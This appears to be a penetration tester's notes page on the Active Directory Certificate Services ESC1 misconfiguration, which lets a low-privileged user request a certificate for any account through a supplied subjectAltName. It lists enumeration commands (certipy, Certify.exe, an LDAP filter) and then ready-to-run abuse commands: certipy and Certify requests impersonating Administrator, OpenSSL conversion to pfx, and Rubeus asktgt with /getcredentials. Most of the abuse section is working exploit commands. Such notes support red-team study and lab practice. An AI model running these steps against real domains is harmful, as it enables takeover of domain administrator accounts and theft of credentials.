## Overview
The primary misconfiguration behind this domain escalation scenario lies in the possibility of specifying an alternate user in the certificate request. This means that if a certificate template allows including a `subjectAltName` (`SAN`) different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain.

So you should try to find a certificate that has `Enrollee Supplies Subject` and has EKU for authentication.

To abuse `ESC1` the following conditions must be met:
1. The Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (social engineering tactics can bypass these security measures).
3. No authorized signatures are required.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template defines EKUs that enable authentication.
6. The certificate template allows requesters to specify a `subjectAltName (SAN)` in the `CSR`.

---
## Enumeration
### Linux 
#### Using certipy:
- `Requires Manager Approval`: `False`.
- `Authorized Signature Required`: `0`.
- `Client Authentication`: `True` or Extended Key Usage `Client Authentication`.
- `Enrollee Supplies Subject`: `True`.
### Windows
#### Using certify.exe:
```powershell
.\Certify.exe find /vulnerable
msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
```
#### PowerShell ADCS Enumeration
```powershell
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```
---
## Abuse
### Linux
To abuse the `ESC1` vulnerable template, we must use `certipy` to request a Certificate and include the alternate subject.
```sh
certipy req -u "$USER" -p "$PASSWORD" -dc-ip "$IP" -ca "$CA" -template ESC1 -upn Administrator
certipy auth -pfx administrator.pfx -username administrator -domain "$DOMAIN" -dc-ip "$IP"
```

### Windows
```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local 
```
we must use `OpenSSL` and convert the certificate to `pfx` format. We must copy the `cert.pem` output from the above command and save it to our Linux machine or use `OpenSSL` on Windows if installed.
```powershell
# leave the password empty
# When you copy it don't leave any new line after -----END CERTIFICATE-----
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```
